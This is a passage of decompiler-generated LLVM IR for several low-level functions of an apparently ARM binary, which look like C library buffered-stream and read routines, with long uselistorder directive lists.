  %v1_16380 = load i32, i32* @sp, align 4
  %v2_16380 = inttoptr i32 %v1_16380 to i32*
  store i32 0, i32* %v2_16380, align 4
  %v4_16384 = call i32 @function_16608(i32 %arg1, i32 0, i32 %v0_16378, i32 %v0_1637c)
  %v0_16388 = load i32, i32* @r5, align 4
  %v1_16388 = load i32, i32* %r6.global-to-local, align 4
  %v9_16388 = icmp eq i32 %v0_16388, %v1_16388
  br i1 %v9_16388, label %dec_label_pc_16390, label %dec_label_pc_163fc

dec_label_pc_16390:                               ; preds = %dec_label_pc_16370
  %v0_16390 = call i32 @function_11734()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1639c = inttoptr i32 %v0_16390 to i32*
  store i32 22, i32* %v2_1639c, align 4
  %v0_16400.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_163a4:                               ; preds = %dec_label_pc_16354
  %v1_163a4 = inttoptr i32 %v0_163a8 to i32*
  %v2_163a4 = load i32, i32* %v1_163a4, align 4
  %v3_163a4 = add i32 %v0_163a8, 4
  %v4_163a4 = inttoptr i32 %v3_163a4 to i32*
  %v5_163a4 = load i32, i32* %v4_163a4, align 4
  store i32 %v5_163a4, i32* %r4.global-to-local, align 4
  %v1_163a8 = add i32 %v0_163a8, 8
  store i32 %v1_163a8, i32* %sb.global-to-local, align 4
  %v1_163ac = inttoptr i32 %v1_163a8 to i32*
  %v2_163ac = load i32, i32* %v1_163ac, align 4
  store i32 %v2_163ac, i32* %sb.global-to-local, align 4
  %v3_163ac = add i32 %v0_163a8, 12
  %v4_163ac = inttoptr i32 %v3_163ac to i32*
  %v5_163ac = load i32, i32* %v4_163ac, align 4
  store i32 %v5_163ac, i32* %sl.global-to-local, align 4
  %v1_163b0 = inttoptr i32 %v0_163b0 to i32*
  store i32 %v2_163a4, i32* %v1_163b0, align 4
  %v3_163b0 = add i32 %v0_163b0, 4
  %v4_163b0 = inttoptr i32 %v3_163b0 to i32*
  %v5_163b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_163b0, i32* %v4_163b0, align 4
  %v0_163b4 = load i32, i32* @r7, align 4
  %v1_163b4 = add i32 %v0_163b4, 8
  %v1_163b8 = inttoptr i32 %v1_163b4 to i32*
  %v2_163b8 = load i32, i32* %v1_163b8, align 4
  %v3_163b8 = add i32 %v0_163b4, 12
  %v4_163b8 = inttoptr i32 %v3_163b8 to i32*
  %v5_163b8 = load i32, i32* %v4_163b8, align 4
  store i32 %v5_163b8, i32* @r4, align 4
  %v1_163bc = load i32, i32* @r5, align 4
  %v2_163bc = add i32 %v1_163bc, 8
  %v3_163bc = inttoptr i32 %v2_163bc to i32*
  store i32 %v2_163b8, i32* %v3_163bc, align 4
  %v0_163c0 = load i32, i32* @r4, align 4
  %v1_163c0 = load i32, i32* @r5, align 4
  %v2_163c0 = add i32 %v1_163c0, 12
  %v3_163c0 = inttoptr i32 %v2_163c0 to i32*
  store i32 %v0_163c0, i32* %v3_163c0, align 4
  %v0_163c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_163c4 = trunc i32 %v0_163c4 to i16
  %v2_163c4 = load i32, i32* @r5, align 4
  %v3_163c4 = add i32 %v2_163c4, 16
  %v4_163c4 = inttoptr i32 %v3_163c4 to i16*
  store i16 %v1_163c4, i16* %v4_163c4, align 2
  %v0_163c8 = load i32, i32* @r7, align 4
  %v1_163c8 = add i32 %v0_163c8, 18
  %v2_163c8 = inttoptr i32 %v1_163c8 to i8*
  %v3_163c8 = load i8, i8* %v2_163c8, align 1
  %v4_163c8 = zext i8 %v3_163c8 to i32
  store i32 %v4_163c8, i32* @r3, align 4
  %v2_163cc = load i32, i32* @r5, align 4
  %v3_163cc = add i32 %v2_163cc, 18
  %v4_163cc = inttoptr i32 %v3_163cc to i8*
  store i8 %v3_163c8, i8* %v4_163cc, align 1
  %v0_163d0 = load i32, i32* @r7, align 4
  %v1_163d0 = add i32 %v0_163d0, 16
  %v2_163d0 = inttoptr i32 %v1_163d0 to i16*
  %v3_163d0 = load i16, i16* %v2_163d0, align 2
  %v4_163d0 = zext i16 %v3_163d0 to i32
  %v1_163d4 = add nsw i32 %v4_163d0, -19
  store i32 %v1_163d4, i32* @r2, align 4
  %v0_163d8 = call i32 @function_11840()
  %v0_163dc = load i32, i32* @r7, align 4
  %v1_163dc = add i32 %v0_163dc, 16
  %v2_163dc = inttoptr i32 %v1_163dc to i16*
  %v3_163dc = load i16, i16* %v2_163dc, align 2
  %v4_163dc = zext i16 %v3_163dc to i32
  %v0_163e0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_163e0, i32* @r5, align 4
  %v2_163e4 = add i32 %v4_163dc, %v0_163dc
  store i32 %v2_163e4, i32* @r7, align 4
  br label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %dec_label_pc_16334, %dec_label_pc_163a4
  %v0_163b0 = phi i32 [ %tmp, %dec_label_pc_16334 ], [ %v0_163e0, %dec_label_pc_163a4 ]
  %v0_163a8 = phi i32 [ %v1_162e8, %dec_label_pc_16334 ], [ %v2_163e4, %dec_label_pc_163a4 ]
  %v3_163ec = icmp ult i32 %v0_163a8, %v2_16334
  %v1_163f0 = add i32 %v0_163b0, 19
  store i32 %v1_163f0, i32* @r0, align 4
  %v1_163f4 = add i32 %v0_163a8, 19
  store i32 %v1_163f4, i32* @r1, align 4
  br i1 %v3_163ec, label %dec_label_pc_16354, label %dec_label_pc_163fc.loopexit

dec_label_pc_163fc.loopexit:                      ; preds = %dec_label_pc_163e8
  %v0_163fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_163fc

dec_label_pc_163fc:                               ; preds = %dec_label_pc_163fc.loopexit, %dec_label_pc_16370
  %v1_163fc = phi i32 [ %v0_163b0, %dec_label_pc_163fc.loopexit ], [ %v0_16388, %dec_label_pc_16370 ]
  %v0_163fc = phi i32 [ %v0_163fc.pre, %dec_label_pc_163fc.loopexit ], [ %v1_16388, %dec_label_pc_16370 ]
  %v2_163fc = sub i32 %v1_163fc, %v0_163fc
  store i32 %v2_163fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %dec_label_pc_16390, %dec_label_pc_1632c, %dec_label_pc_163fc
  %v0_16400 = phi i32 [ %v0_16400.pre, %dec_label_pc_16390 ], [ %v0_1632c, %dec_label_pc_1632c ], [ %v2_163fc, %dec_label_pc_163fc ]
  store i32 %v3_162d0, i32* %r4.global-to-local, align 4
  store i32 %v6_162d0, i32* @r5, align 4
  store i32 %v12_162d0, i32* @r7, align 4
  ret i32 %v0_16400

; uselistorder directives
  uselistorder i32 %v0_163a8, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_163b0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_162e8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 9, 10, 0, 3, 11, 4, 12, 13, 5, 6, 7, 8, 1, 14, 2, 15 }
  uselistorder i32* @r3, { 7, 8, 52, 53, 85, 86, 2, 87, 88, 89, 3, 90, 91, 92, 4, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 0, 111, 112, 113, 114, 9, 6, 10, 11, 12, 13, 14, 54, 55, 115, 124, 125, 126, 119, 47, 48, 78, 79, 80, 81, 76, 82, 83, 15, 16, 17, 130, 127, 128, 129, 1, 131, 132, 133, 120, 18, 77, 37, 38, 39, 121, 122, 123, 66, 56, 116, 117, 118, 49, 50, 51, 57, 58, 5, 72, 73, 74, 75, 32, 33, 34, 35, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 36, 40, 41, 43, 42, 45, 84, 44, 46, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 70, 71 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 7, 12, 13, 8, 14, 9, 15, 10, 16 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 7, { 24, 22, 23, 14, 0, 1, 41, 15, 29, 17, 25, 18, 26, 19, 27, 16, 28, 2, 20, 30, 4, 31, 5, 32, 6, 33, 7, 34, 21, 35, 8, 36, 9, 37, 10, 38, 11, 39, 12, 13, 3, 40 }
  uselistorder i32* @ip, { 7, 43, 44, 8, 9, 71, 10, 11, 6, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 2, 105, 106, 107, 108, 109, 110, 111, 112, 113, 12, 0, 13, 14, 15, 16, 17, 114, 115, 39, 66, 3, 60, 61, 62, 63, 64, 65, 67, 68, 69, 119, 116, 117, 118, 1, 120, 32, 18, 19, 57, 58, 59, 51, 52, 53, 54, 55, 56, 45, 46, 47, 48, 49, 50, 4, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 70, 20, 21, 33, 34, 35, 36, 37, 38, 40, 5, 41, 42 }
  uselistorder i1 false, { 0, 23, 24, 25, 38, 20, 22, 39, 40, 41, 42, 43, 2, 1, 26, 29, 28, 27, 30, 4, 6, 5, 18, 37, 36, 21, 17, 33, 10, 34, 19, 9, 8, 7, 11, 12, 13, 31, 3, 14, 15, 16, 35, 32, 44 }
  uselistorder i32 -8, { 37, 17, 18, 19, 20, 21, 22, 16, 15, 9, 14, 13, 12, 11, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 38, 40, 33, 41, 36, 10, 34, 35, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 14, { 20, 24, 36, 16, 17, 18, 0, 21, 22, 19, 3, 23, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 25, 26, 15, 27, 28, 29, 30, 1, 31, 32, 33, 34, 2, 35 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16400, { 2, 0, 1 }
  uselistorder label %dec_label_pc_163e8, { 1, 0 }
}

define i32 @function_16410(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16410:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16410 = load i32, i32* @r4, align 4
  store i32 %v3_16410, i32* %stack_var_-12, align 4
  %v0_16414 = load i32, i32* %r0.global-to-local, align 4
  %v1_16414 = inttoptr i32 %v0_16414 to i16*
  %v2_16414 = load i16, i16* %v1_16414, align 2
  %v3_16414 = zext i16 %v2_16414 to i32
  %v1_16418 = and i32 %v3_16414, 4
  store i32 %v1_16418, i32* %r5.global-to-local, align 4
  %v2_16418 = icmp eq i32 %v1_16418, 0
  store i32 %v0_16414, i32* %r4.global-to-local, align 4
  br i1 %v2_16418, label %dec_label_pc_1642c, label %bb

bb:                                               ; preds = %dec_label_pc_16410
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16410
  %v1_1642c = icmp slt i32 %arg2, 0
  br i1 %v1_1642c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1642c
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1642c, %bb18
  %v1_16434 = add i32 %v0_16414, 4
  %v2_16434 = inttoptr i32 %v1_16434 to i32*
  %v3_16434 = load i32, i32* %v2_16434, align 4
  store i32 %v3_16434, i32* %r0.global-to-local, align 4
  %v1_16438 = call i32 @function_110a4(i32 %v3_16434)
  store i32 %v1_16438, i32* %r0.global-to-local, align 4
  %v5_16440 = icmp sgt i32 %v1_16438, 0
  br i1 %v5_16440, label %.thread7, label %dec_label_pc_16444

dec_label_pc_16444:                               ; preds = %bb19
  %v2_1643c = icmp eq i32 %v1_16438, 0
  %v0_16444 = load i32, i32* %r4.global-to-local, align 4
  %v1_16444 = inttoptr i32 %v0_16444 to i16*
  %v2_16444 = load i16, i16* %v1_16444, align 2
  br i1 %v2_1643c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_16444
  %v2_16448 = or i16 %v2_16444, 4
  store i16 %v2_16448, i16* %v1_16444, align 2
  %v1_16464.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_16444
  %v2_1644c = or i16 %v2_16444, 8
  store i16 %v2_1644c, i16* %v1_16444, align 2
  %v1_16458 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16458, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_16464 = phi i32 [ %v1_16464.pre, %bb20 ], [ 0, %bb ], [ %v1_16438, %bb19 ], [ %v1_16458, %bb21 ]
  %v2_16460 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16460, i32* @r4, align 4
  ret i32 %v1_16464

; uselistorder directives
  uselistorder i16 %v2_16444, { 1, 0 }
  uselistorder i32 %v1_16438, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_110a4, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_16468(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16468:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_16468 = load i32, i32* @r4, align 4
  store i32 %v3_16468, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_164802 = icmp eq i32 %arg3, 0
  store i1 %v2_164802, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164802, label %dec_label_pc_16510, label %dec_label_pc_16488

dec_label_pc_16480thread-pre-split:               ; preds = %dec_label_pc_16488
  %v3_164a0 = load i32, i32* %r6.global-to-local, align 4
  %v5_164a0 = add i32 %v3_164a0, %v3_16498
  store i32 %v5_164a0, i32* %r6.global-to-local, align 4
  %v4_164a4 = load i32, i32* %r5.global-to-local, align 4
  %v5_164a4 = sub i32 %v4_164a4, %v3_16498
  store i32 %v5_164a4, i32* %r5.global-to-local, align 4
  %v2_16480 = icmp eq i32 %v5_164a4, 0
  store i1 %v2_16480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16480, label %dec_label_pc_16480.dec_label_pc_16510.loopexit_crit_edge, label %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge

dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge: ; preds = %dec_label_pc_16480thread-pre-split
  %v3_16488.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_16494.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %dec_label_pc_16468, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge
  %v0_16494 = phi i32 [ %v0_16494.pre, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge ], [ %tmp, %dec_label_pc_16468 ]
  %v0_16490 = phi i32 [ %v5_164a0, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge ], [ %arg2, %dec_label_pc_16468 ]
  %v3_16488 = phi i32 [ %v3_16488.pre, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge ], [ 2147483647, %dec_label_pc_16468 ]
  %v0_1648c.in = phi i32 [ %v5_164a4, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge ], [ %arg3, %dec_label_pc_16468 ]
  %v3_1648c = phi i32 [ %v5_164a4, %dec_label_pc_16480thread-pre-split.dec_label_pc_16488_crit_edge ], [ %arg3, %dec_label_pc_16468 ]
  %v0_1648c = icmp slt i32 %v0_1648c.in, 0
  %storemerge = select i1 %v0_1648c, i32 %v3_16488, i32 %v3_1648c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_16490, i32* %r1.global-to-local, align 4
  %v1_16494 = add i32 %v0_16494, 4
  %v2_16494 = inttoptr i32 %v1_16494 to i32*
  %v3_16494 = load i32, i32* %v2_16494, align 4
  %v3_16498 = call i32 @function_11218(i32 %v3_16494, i32 %v0_16490)
  %v1_1649c = icmp slt i32 %v3_16498, 0
  %v2_1649c = icmp eq i32 %v3_16498, 0
  store i1 %v2_1649c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1649c, label %dec_label_pc_164ac, label %dec_label_pc_16480thread-pre-split

dec_label_pc_164ac:                               ; preds = %dec_label_pc_16488
  %v0_164ac = load i32, i32* %r4.global-to-local, align 4
  %v1_164ac = inttoptr i32 %v0_164ac to i16*
  %v2_164ac = load i16, i16* %v1_164ac, align 2
  %v3_164ac = zext i16 %v2_164ac to i32
  store i32 %v3_164ac, i32* %r3.global-to-local, align 4
  %v1_164b0 = add i32 %v0_164ac, 8
  store i32 %v1_164b0, i32* %r1.global-to-local, align 4
  %v1_164b4 = inttoptr i32 %v1_164b0 to i32*
  %v2_164b4 = load i32, i32* %v1_164b4, align 4
  store i32 %v2_164b4, i32* %r1.global-to-local, align 4
  %v3_164b4 = add i32 %v0_164ac, 12
  %v4_164b4 = inttoptr i32 %v3_164b4 to i32*
  %v5_164b4 = load i32, i32* %v4_164b4, align 4
  %v1_164b8 = or i32 %v3_164ac, 8
  store i32 %v1_164b8, i32* %r3.global-to-local, align 4
  %v2_164bc = sub i32 %v5_164b4, %v2_164b4
  store i32 %v2_164bc, i32* %r2.global-to-local, align 4
  %v9_164bc = icmp eq i32 %v5_164b4, %v2_164b4
  store i1 %v9_164bc, i1* %cpsr_z.global-to-local, align 1
  %v1_164c0 = trunc i32 %v1_164b8 to i16
  store i16 %v1_164c0, i16* %v1_164ac, align 2
  br i1 %v9_164bc, label %dec_label_pc_164ac.dec_label_pc_1650c_crit_edge, label %dec_label_pc_164c8

dec_label_pc_164ac.dec_label_pc_1650c_crit_edge:  ; preds = %dec_label_pc_164ac
  %v0_1650c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1650c

dec_label_pc_164c8:                               ; preds = %dec_label_pc_164ac
  %v0_164c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_164c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_164c8 = icmp ult i32 %v0_164c8, %v1_164c8
  %v9_164c8 = icmp eq i32 %v0_164c8, %v1_164c8
  store i1 %v9_164c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_164c8, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_164c8
  store i32 %v1_164c8, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_164c8, %bb23
  %v2_164dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_164f0
  %v2_164dc = phi i32 [ %v2_164dc.pre, %.preheader ], [ %v1_164f4, %dec_label_pc_164f0 ]
  %v0_164d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_164d0 = inttoptr i32 %v0_164d0 to i8*
  %v2_164d0 = load i8, i8* %v1_164d0, align 1
  %v3_164d0 = zext i8 %v2_164d0 to i32
  store i32 %v3_164d0, i32* %r3.global-to-local, align 4
  %v7_164d4 = icmp eq i8 %v2_164d0, 10
  store i1 %v7_164d4, i1* %cpsr_z.global-to-local, align 1
  %v1_164d8 = add i32 %v0_164d0, 1
  store i32 %v1_164d8, i32* %r6.global-to-local, align 4
  %v3_164dc = inttoptr i32 %v2_164dc to i8*
  store i8 %v2_164d0, i8* %v3_164dc, align 1
  %v0_164e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_164e0, label %dec_label_pc_164e4, label %dec_label_pc_164f0

dec_label_pc_164e4:                               ; preds = %bb24
  %v0_164e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e4 = inttoptr i32 %v0_164e4 to i16*
  %v2_164e4 = load i16, i16* %v1_164e4, align 2
  %v3_164e4 = zext i16 %v2_164e4 to i32
  store i32 %v3_164e4, i32* %r3.global-to-local, align 4
  %v1_164e8 = and i32 %v3_164e4, 256
  %v2_164e8 = icmp eq i32 %v1_164e8, 0
  store i1 %v2_164e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164e8, label %dec_label_pc_164f0, label %dec_label_pc_164e4.dec_label_pc_164fc_crit_edge

dec_label_pc_164e4.dec_label_pc_164fc_crit_edge:  ; preds = %dec_label_pc_164e4
  %v0_16500.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_164fc

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164e4, %bb24
  %v0_164f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_164f0 = add i32 %v0_164f0, -1
  store i32 %v1_164f0, i32* %r2.global-to-local, align 4
  %v7_164f0 = icmp eq i32 %v0_164f0, 1
  store i1 %v7_164f0, i1* %cpsr_z.global-to-local, align 1
  %v0_164f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_164f4 = add i32 %v0_164f4, 1
  store i32 %v1_164f4, i32* %r1.global-to-local, align 4
  br i1 %v7_164f0, label %dec_label_pc_164f0.dec_label_pc_164fc_crit_edge, label %bb24

dec_label_pc_164f0.dec_label_pc_164fc_crit_edge:  ; preds = %dec_label_pc_164f0
  %v0_164fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164fc

dec_label_pc_164fc:                               ; preds = %dec_label_pc_164e4.dec_label_pc_164fc_crit_edge, %dec_label_pc_164f0.dec_label_pc_164fc_crit_edge
  %v0_16500 = phi i32 [ %v1_164f4, %dec_label_pc_164f0.dec_label_pc_164fc_crit_edge ], [ %v0_16500.pre, %dec_label_pc_164e4.dec_label_pc_164fc_crit_edge ]
  %v0_164fc = phi i32 [ %v0_164fc.pre, %dec_label_pc_164f0.dec_label_pc_164fc_crit_edge ], [ %v0_164e4, %dec_label_pc_164e4.dec_label_pc_164fc_crit_edge ]
  %v1_164fc = add i32 %v0_164fc, 8
  %v2_164fc = inttoptr i32 %v1_164fc to i32*
  %v3_164fc = load i32, i32* %v2_164fc, align 4
  store i32 %v3_164fc, i32* %r3.global-to-local, align 4
  %v2_16500 = add i32 %v0_164fc, 16
  %v3_16500 = inttoptr i32 %v2_16500 to i32*
  store i32 %v0_16500, i32* %v3_16500, align 4
  %v0_16504 = load i32, i32* %r3.global-to-local, align 4
  %v1_16504 = load i32, i32* %r1.global-to-local, align 4
  %v2_16504 = sub i32 %v1_16504, %v0_16504
  store i32 %v2_16504, i32* %r3.global-to-local, align 4
  %v1_16508 = load i32, i32* %r5.global-to-local, align 4
  %v2_16508 = sub i32 %v1_16508, %v2_16504
  store i32 %v2_16508, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1650c

dec_label_pc_1650c:                               ; preds = %dec_label_pc_164ac.dec_label_pc_1650c_crit_edge, %dec_label_pc_164fc
  %v0_1650c = phi i32 [ %v0_1650c.pre, %dec_label_pc_164ac.dec_label_pc_1650c_crit_edge ], [ %v2_16508, %dec_label_pc_164fc ]
  %v1_1650c = load i32, i32* @r7, align 4
  %v2_1650c = sub i32 %v1_1650c, %v0_1650c
  br label %dec_label_pc_16510

dec_label_pc_16480.dec_label_pc_16510.loopexit_crit_edge: ; preds = %dec_label_pc_16480thread-pre-split
  %v0_16510.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %dec_label_pc_16468, %dec_label_pc_16480.dec_label_pc_16510.loopexit_crit_edge, %dec_label_pc_1650c
  %v0_16510 = phi i32 [ %v2_1650c, %dec_label_pc_1650c ], [ %v0_16510.pre.pre, %dec_label_pc_16480.dec_label_pc_16510.loopexit_crit_edge ], [ 0, %dec_label_pc_16468 ]
  %v2_16514 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16514, i32* %r4.global-to-local, align 4
  ret i32 %v0_16510

; uselistorder directives
  uselistorder i32 %v0_164fc, { 1, 0 }
  uselistorder i32 %v1_164f4, { 0, 2, 1 }
  uselistorder i32 %v0_164f0, { 1, 0 }
  uselistorder i32 %v1_164c8, { 0, 2, 1 }
  uselistorder i32 %v0_164c8, { 1, 0 }
  uselistorder i32 %v5_164b4, { 1, 0 }
  uselistorder i32 %v2_164b4, { 1, 0, 2 }
  uselistorder i32 %v3_16498, { 2, 3, 0, 1 }
  uselistorder i32 %v0_16490, { 1, 0 }
  uselistorder i32 %v5_164a4, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 256, { 295, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 287, 296, 293, 294, 297, 36, 38, 37, 39, 286, 40, 41, 42, 0, 292, 1, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 290, 56, 298, 299, 57, 58, 59, 301, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 70, 69, 72, 291, 302, 300, 73, 74, 75, 76, 303, 77, 78, 79, 80, 81, 304, 82, 83, 84, 85, 305, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 97, 96, 98, 99, 2, 108, 104, 109, 105, 100, 101, 102, 110, 106, 111, 107, 103, 112, 113, 114, 115, 116, 126, 127, 121, 128, 122, 117, 118, 123, 129, 124, 130, 125, 119, 120, 131, 132, 133, 134, 139, 137, 135, 140, 138, 136, 141, 142, 144, 146, 147, 145, 143, 148, 288, 306, 149, 151, 150, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 166, 164, 162, 167, 165, 163, 168, 169, 171, 173, 174, 172, 170, 175, 289, 307, 176, 178, 177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 308, 189, 309, 198, 193, 199, 194, 195, 190, 191, 200, 196, 192, 197, 201, 202, 203, 204, 205, 206, 207, 214, 211, 215, 212, 216, 213, 208, 209, 210, 217, 218, 219, 220, 225, 232, 226, 233, 227, 221, 222, 234, 228, 223, 229, 235, 230, 224, 231, 236, 237, 238, 239, 240, 241, 246, 253, 247, 254, 248, 242, 243, 255, 249, 244, 250, 256, 251, 245, 252, 257, 258, 259, 260, 261, 262, 272, 268, 263, 273, 269, 274, 270, 264, 265, 266, 275, 271, 267, 276, 277, 278, 279, 280, 281, 3, 282, 283, 4, 284, 285 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_11218, { 2, 1, 0 }
  uselistorder i32 4, { 210, 211, 212, 204, 205, 347, 213, 471, 5, 6, 214, 7, 8, 71, 0, 9, 80, 75, 76, 10, 472, 77, 473, 61, 11, 12, 78, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 13, 491, 492, 493, 494, 495, 496, 60, 497, 498, 499, 500, 501, 502, 14, 15, 79, 503, 215, 97, 216, 16, 217, 98, 218, 219, 220, 221, 134, 222, 223, 224, 225, 226, 227, 17, 206, 207, 208, 209, 295, 296, 199, 200, 201, 202, 203, 504, 135, 99, 505, 18, 506, 136, 137, 62, 423, 424, 425, 426, 427, 428, 138, 139, 19, 429, 430, 431, 432, 433, 434, 435, 436, 140, 421, 422, 397, 398, 399, 400, 401, 402, 403, 404, 405, 20, 406, 407, 408, 437, 21, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 141, 142, 143, 452, 453, 456, 459, 454, 455, 100, 144, 457, 52, 458, 460, 461, 462, 464, 145, 23, 22, 463, 146, 147, 148, 257, 149, 53, 24, 25, 297, 298, 299, 300, 301, 26, 302, 465, 466, 198, 27, 28, 101, 258, 63, 250, 102, 251, 150, 252, 259, 260, 29, 261, 81, 103, 104, 245, 246, 253, 254, 105, 228, 229, 230, 106, 231, 232, 233, 107, 234, 108, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 247, 248, 249, 255, 256, 56, 55, 262, 72, 263, 30, 264, 31, 58, 57, 266, 32, 265, 267, 268, 273, 109, 275, 110, 276, 111, 277, 278, 274, 269, 